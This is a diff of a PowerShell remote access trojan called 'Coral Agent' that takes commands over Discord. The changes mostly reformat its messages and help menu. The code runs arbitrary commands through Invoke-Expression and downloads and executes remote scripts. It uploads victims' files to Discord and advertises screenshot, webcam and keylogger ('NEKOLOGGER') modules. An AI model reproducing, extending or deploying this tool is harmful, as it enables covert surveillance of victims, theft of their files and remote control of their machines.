@@ -641,16 +641,16 @@ function Start_AgentJob {
                                 $result = Invoke-Expression $CommandString 2>&1
                                 if ($result) {
                                     $output = $result | Out-String
-                                    sendMsg -Message "``````$output``````"
+                                    sendEmbedWithImage -Title "Command executed successfully" -Description "``````$output``````"
                                 } else {
-                                    sendMsg -Message "**Command executed successfully (no output)**"
+                                    sendEmbedWithImage -Title "Command executed successfully" -Description "No output returned."
                                 }
                             } catch {
                                 $errorMsg = $_.Exception.Message
                                 if ($errorMsg.Length -gt 1000) {
                                     $errorMsg = $errorMsg.Substring(0, 1000) + "... (error truncated)"
                                 }
-                                sendMsg -Message ":x: ``Job Error: $errorMsg`` :x:"
+                                sendEmbedWithImage -Title ":x: **Error executing command**" -Description "``````$errorMsg``````"
                             }
                         }
                     }
@@ -662,7 +662,7 @@ function Start_AgentJob {
     } -ArgumentList $ScriptString, $global:token, $global:SessionID, $global:CategoryID, $global:ModuleRegistry, $global:themes, $global:currenttheme, $global:theme_enabled
     
     $script:Jobs[$RandName] = $job
-    sendMsg -Message ":gear: **Job Started:** ``$RandName`` | ID: $($job.Id)"
+    sendEmbedWithImage -Title JOB -Description ":gear: **Job Started:** ``$RandName`` | ID: $($job.Id)"
     return $RandName
 }
 
@@ -686,7 +686,7 @@ function List_AgentJobs {
     }
     
     if ($jobList.Count -eq 0) {
-        sendMsg -Message "**No active jobs found**"
+        sendEmbedWithImage -Title "No Active Jobs" -Description ":information_source: **There are currently no active jobs.**"
         return
     }
     
@@ -694,7 +694,7 @@ function List_AgentJobs {
     foreach ($job in $jobList) {
         $msg += "**$($job.JobName)** (ID: $($job.JobId)) - Status: $($job.Status)`n"
     }
-    sendMsg -Message $msg
+    sendEmbedWithImage -Title "Job List" -Description $msg
 }
 
 function Remove_AgentJob {
@@ -706,9 +706,9 @@ function Remove_AgentJob {
         } catch {}
         Remove-Job -Job $job -Force
         $script:Jobs.Remove($JobName)
-        sendMsg -Message " **Job Removed:** ``$JobName``"
+        sendEmbedWithImage -Title "Job Removed" -Description ":stop_sign: **Job Removed:** ``$JobName``"
     } else {
-        sendMsg -Message ":x: **Job Not Found:** ``$JobName``"
+        sendEmbedWithImage -Title "Job Not Found" -Description ":x: **Job Not Found:** ``$JobName``"
     }
 }
 
@@ -747,9 +747,9 @@ function Get_AgentJobOutput {
             $msg += "`n**Errors:** No errors```""
         }
         
-        sendMsg -Message $msg
+        sendEmbedWithImage -Title "Job Output" -Description $msg
     } else {
-        sendMsg -Message ":x: **Job Not Found:** ``$JobName``"
+        sendEmbedWithImage -Title "Job Not Found" -Description ":x: **Job Not Found:** ``$JobName``"
     }
 }
 
@@ -774,15 +774,15 @@ function Get_AgentJobStatus {
         $errorCount = ($job.ChildJobs | ForEach-Object { $_.Error.Count } | Measure-Object -Sum).Sum
         $msg += "**Error Count:** $errorCount"
         
-        sendMsg -Message $msg
+        sendEmbedWithImage -Title "Job Status" -Description $msg
     } else {
-        sendMsg -Message ":x: **Job Not Found:** ``$JobName``"
+        sendEmbedWithImage -Title "Job Not Found" -Description ":x: **Job Not Found:** ``$JobName``"
     }
 }
 
 function Stop_AllAgentJobs {
     if ($script:Jobs.Count -eq 0) {
-        sendMsg -Message ":information_source: **No jobs to stop**"
+        sendEmbedWithImage -Title "No Active Jobs" -Description ":information_source: **No active jobs to stop.**"
         return
     }
     
@@ -796,7 +796,7 @@ function Stop_AllAgentJobs {
             $stoppedCount++
         } catch {}
     }
-    sendMsg -Message ":stop_sign: **Stopped $stoppedCount job(s)**"
+    sendEmbedWithImage -Title "All Jobs Stopped" -Description ":stop_sign: **All jobs stopped. Total jobs stopped: $stoppedCount**"
 }
 
 function Check_CompletedJobs {
@@ -819,7 +819,7 @@ function Check_CompletedJobs {
             if ($errors) { 
                 $msg += "`n:warning: **Errors:**`n```$errors```""
             }
-            sendMsg -Message $msg
+            sendEmbedWithImage -Title "Job Completed" -Description $msg
         }
     }
 }
@@ -858,7 +858,7 @@ $global:ModuleRegistry = @{
     # Theme System Module
     themes = @{
         name = "Theme Management System"
-        functions = @("GetCurrentTheme", "SetCurrentTheme", "EnableTheme", "DisableTheme")
+        functions = @("GETCURRENTTHEME", "SETCURRENTTHEME", "ENABLETHEME", "DISABLETHEME")
         loaded = $true
         required = $true
     }
@@ -866,7 +866,7 @@ $global:ModuleRegistry = @{
     # File System Module
     filesystem = @{
         name = "File Operations"
-        functions = @("sendFile", "downloadFile")
+        functions = @("SENDFILE", "DOWNLOADFILE")
         loaded = $true
         required = $true
     }
@@ -890,7 +890,7 @@ $global:ModuleRegistry = @{
     # FFmpeg Module
     ffmpeg = @{
         name = "FFmpeg Operations"
-        functions = @("GetFfmpeg", "RemoveFfmpeg")
+        functions = @("GETFFMPEG", "REMOVEFFMPEG")
         loaded = $true
         required = $false
     }
@@ -1126,8 +1126,7 @@ function Is_LocalFunction {
 }
 
 function List_Modules {
-    $msg = ":package: **Available Modules:**`n`n"
-    sendEmbedWithImage -Title "TESTING" -Description "TESTING IF sendEmbedWithImage works"
+    $msg = ":package: **Available Modules:**`n`nThose in caps in commands while the remaining are functions in the code!`n"
     foreach ($moduleName in $global:ModuleRegistry.Keys) {
         $module = $global:ModuleRegistry[$moduleName]
         $status = if ($module.loaded) { ":green_circle: Loaded" } else { ":red_circle: Not Loaded" }
@@ -1139,19 +1138,17 @@ function List_Modules {
             foreach ($scriptName in $module.scripts.Keys) {
                 $script = $module.scripts[$scriptName]
                 $params = if ($script.params.Count -gt 0) { " [" + ($script.params -join ", ") + "]" } else { "" }
-                $msg += " **$($script.alias)**$params - $($script.description)`n"
+                $msg += "-> **$($script.alias)**$params - $($script.description)`n"
             }
         } elseif ($module.ContainsKey("functions")) {
             foreach ($func in $module.functions) {
-                $msg += "**$func**`n"
+                $msg += "-> **$func**`n"
             }
         }
         $msg += "`n"
     }
     
     sendEmbedWithImage -Title "Available Modules" -Description $msg
-    #fallback as doesnt work when called remotely
-    sendMsg -Message $msg
 }
 
 
@@ -1220,7 +1217,7 @@ function Execute_DynamicCommand {
             & $Command
             return $true
         } catch {
-            sendMsg -Message ":x: **Error executing local function:** ``$Command`` - $($_.Exception.Message)"
+            sendEmbedWithImage -Title "ERROR" -Description ":x: **Error executing local function:** ``$Command`` - $($_.Exception.Message)"
             return $false
         }
     }
@@ -1238,8 +1235,8 @@ function Execute_DynamicCommand {
         $script = $commandInfo.Script
         
         try {
-            sendMsg -Message ":gear: **Loading:** ``$($script.alias)`` **from module:** ``$($commandInfo.ModuleName)``"
-            
+            sendEmbedWithImage -Title "Loading Remote Function" -Description ":gear: **Loading:** ``$($script.alias)`` **from module:** ``$($commandInfo.ModuleName)``"
+
             # Download and execute the remote script
             $fullUrl = $module.baseUrl + $script.url
             $scriptContent = Invoke-RestMethod $fullUrl
@@ -1253,7 +1250,7 @@ function Execute_DynamicCommand {
             return $true
             
         } catch {
-            sendMsg -Message ":x: **Error loading remote function:** ``$($script.alias)`` - $($_.Exception.Message)"
+            sendEmbedWithImage -Title "ERROR" -Description ":x: **Error loading remote function:** ``$($script.alias)`` - $($_.Exception.Message)"
             return $false
         }
     } else {
@@ -1262,7 +1259,7 @@ function Execute_DynamicCommand {
             & $commandInfo.FunctionName
             return $true
         } catch {
-            sendMsg -Message ":x: **Error executing function:** ``$($commandInfo.FunctionName)`` - $($_.Exception.Message)"
+            sendEmbedWithImage -Title "ERROR" -Description ":x: **Error executing function:** ``$($commandInfo.FunctionName)`` - $($_.Exception.Message)"
             return $false
         }
     }
@@ -1352,7 +1349,7 @@ function Execute_DynamicCommandWithParams {
             }
             return $true
         } catch {
-            sendMsg -Message ":x: **Error executing local function:** ``$Command`` - $($_.Exception.Message)"
+            sendEmbedWithImage -Title "ERROR" -Description ":x: **Error executing local function:** ``$Command`` - $($_.Exception.Message)"
             return $false
         }
     }
@@ -1370,8 +1367,8 @@ function Execute_DynamicCommandWithParams {
         $script = $commandInfo.Script
         
         try {
-            sendMsg -Message ":gear: **Loading:** ``$($script.alias)`` **from module:** ``$($commandInfo.ModuleName)``"
-            
+            sendEmbedWithImage -Title "Loading command" -Description ":gear: **Loading:** ``$($script.alias)`` **from module:** ``$($commandInfo.ModuleName)``"
+
             # Download and execute the remote script
             $fullUrl = $module.baseUrl + $script.url
             $scriptContent = Invoke-RestMethod $fullUrl
@@ -1391,14 +1388,14 @@ function Execute_DynamicCommandWithParams {
                 
                 # Display parameter info
                 $paramInfo = ($Parameters.GetEnumerator() | ForEach-Object { "$($_.Key): $($_.Value)" }) -join ", "
-                sendMsg -Message ":gear: **Executed with parameters:** ``$paramInfo``"
+                sendEmbedWithImage -Title "Command Executed" -Description ":gear: **Executed with parameters:** ``$paramInfo``"
             } else {
                 & $script.function
             }
             return $true
             
         } catch {
-            sendMsg -Message ":x: **Error loading remote function:** ``$($script.alias)`` - $($_.Exception.Message)"
+            sendEmbedWithImage -Title "ERROR" -Description ":x: **Error loading remote function:** ``$($script.alias)`` - $($_.Exception.Message)"
             return $false
         }
     } else {
@@ -1411,7 +1408,7 @@ function Execute_DynamicCommandWithParams {
             }
             return $true
         } catch {
-            sendMsg -Message ":x: **Error executing function:** ``$($commandInfo.FunctionName)`` - $($_.Exception.Message)"
+            sendEmbedWithImage -Title "ERROR" -Description ":x: **Error executing function:** ``$($commandInfo.FunctionName)`` - $($_.Exception.Message)"
             return $false
         }
     }
@@ -1515,7 +1512,6 @@ function Get_FunctionHelp {
     if ($hardcodedCommands.ContainsKey($functionUpper)) {
         $cmdInfo = $hardcodedCommands[$functionUpper]
         
-        $msg = ":information_source: **Function Help: $functionUpper**`n"
         $msg += "**Description:** $($cmdInfo.description)`n"
         $msg += "**Type:** Hardcoded Command`n"
         
@@ -1527,7 +1523,7 @@ function Get_FunctionHelp {
         
         $msg += "**Usage:** ``$($cmdInfo.usage)``"
         
-        sendMsg -Message $msg
+        sendEmbedWithImage -Title "Function Help: $functionUpper" -Description $msg
         return
     }
     
@@ -1535,13 +1531,12 @@ function Get_FunctionHelp {
     $commandInfo = Find_CommandInRegistry -Command $FunctionName
     
     if (-not $commandInfo.Found) {
-        sendMsg -Message ":x: **Function not found:** ``$FunctionName```n:information_source: **Use** ``COMMANDS`` **to see all available functions**"
+        sendMsg -Message ":x: **Function not found:** ``$FunctionName```n:information_source: **Use** ``HELP`` OR ``MODULES`` **to view all available functions**"
         return
     }
     
     if ($commandInfo.IsRemote) {
         $script = $commandInfo.Script
-        $msg = ":information_source: **Function Help: $($script.alias.ToUpper())**`n"
         $msg += "**Description:** $($script.description)`n"
         $msg += "**Module:** $($commandInfo.ModuleName) (Remote)`n"
         
@@ -1555,7 +1550,7 @@ function Get_FunctionHelp {
             $msg += "**Usage:** ``$($script.alias.ToUpper())``"
         }
         
-        sendMsg -Message $msg
+        sendEmbedWithImage -Title "Function Help: $($script.alias.ToUpper())" -Description $msg
     } else {
         sendMsg -Message ":information_source: **Local function:** ``$($commandInfo.FunctionName)`` - No parameter info available"
     }
@@ -1563,46 +1558,46 @@ function Get_FunctionHelp {
 # =============================== HELP MENU ( R )===============================
 function display_help {
     $message = "
-:robot: **Coral Agent Help Menu - Dynamic Module System:**
+                                         
+Welcome to the Coral Agent Help Menu!
 
-**Basic Commands:**
-- **TEST:** Test the connection to the Coral Network
-- **HELP:** Display this help menu
-- **HELP <function>:** Get detailed help for a specific function
-- **EXIT:** Disconnect from the Coral Network
+Basic Commands:
+-> **TEST**: Test the connection to the Coral Network
+-> **HELP**: Display this help menu
+-> **HELP <function>**: Get detailed help for a specific function
+-> **EXIT**: Disconnect from the Coral Network
 
 **Module Management:**
-- **GETMODULES:** List all available modules and their status plus details about their commands
+-> **GETMODULES:** List all available modules and their status plus details about their commands
 
 **Job Management:**
-- **JOBS:** List all active jobs with their status
-- **CREATEJOB <command>:** Create a new background job
-- **DELETEJOB <jobname>:** Stop and remove a specific job
-- **JOBOUTPUT <jobname>:** Get output and errors from a job
-- **JOBSTATUS <jobname>:** Get detailed status of a job
-- **STOPALLJOBS:** Stop all running jobs
+-> **JOBS:** List all active jobs with their status
+-> **CREATEJOB <command>:** Create a new background job
+-> **DELETEJOB <jobname>:** Stop and remove a specific job
+-> **JOBOUTPUT <jobname>:** Get output and errors from a job
+-> **JOBSTATUS <jobname>:** Get detailed status of a job
+-> **STOPALLJOBS:** Stop all running jobs
 
-**Theme System:**
-- **GETTHEME:** Show current theme status and details
-- **SETTHEME <name>:** Set theme (darktheme, neko_maid, neko_kimono, neko_cafe)
-- **ENABLETHEME:** Enable theme functionality
-- **DISABLETHEME:** Disable theme functionality
+**Job Examples:**
+-> ``CREATEJOB SCREENSHOT``
+-> ``CREATEJOB WEBCAM ``
+-> ``CREATEJOB ENABLENEKOLOGGER``
+
+**Theme System (WIP!s):**
+-> **GETTHEME:** Show current theme status and details
+-> **SETTHEME <name>:** Set theme (darktheme, neko_maid, neko_kimono, neko_cafe)
+-> **ENABLETHEME:** Enable theme functionality
+-> **DISABLETHEME:** Disable theme functionality
 
 **File Operations:**
-- **SENDFILE <filepath>:** Upload a file to Discord
-- **DOWNLOADFILE [path]:** Download file attachments from Discord
+-> **SENDFILE <filepath>:** Upload a file to Discord
+-> **DOWNLOADFILE [path]:** Download file attachments from Discord
 
 **Parameter Usage Examples:**
 **Positional:** ``SETTHEME neko_maid`` ``ENABLENEKOLOGGER 60``
 **Named:** ``SETTHEME -name neko_maid`` ``CREATEJOB -command SCREENSHOT``
 
-**Job Examples:**
-- ``CREATEJOB SCREENSHOT``
-- ``CREATEJOB WEBCAM ``
-- ``CREATEJOB ENABLENEKOLOGGER``
-
 :information_source: **Use** ``MODULES`` **to see all available modules including NEKOLOGGER**
-:gear: **Use** ``HELP ENABLENEKOLOGGER`` **for keylogger help**
 :question: **Use** ``HELP <function>`` **for detailed function help**
 
 **Note:** Dynamic functions (SCREENSHOT, WEBCAM, ENABLENEKOLOGGER, etc.) are only loaded when called
@@ -1756,4 +1751,3 @@ while ($true) {
     }
     Start-Sleep -Seconds 3
 }
-
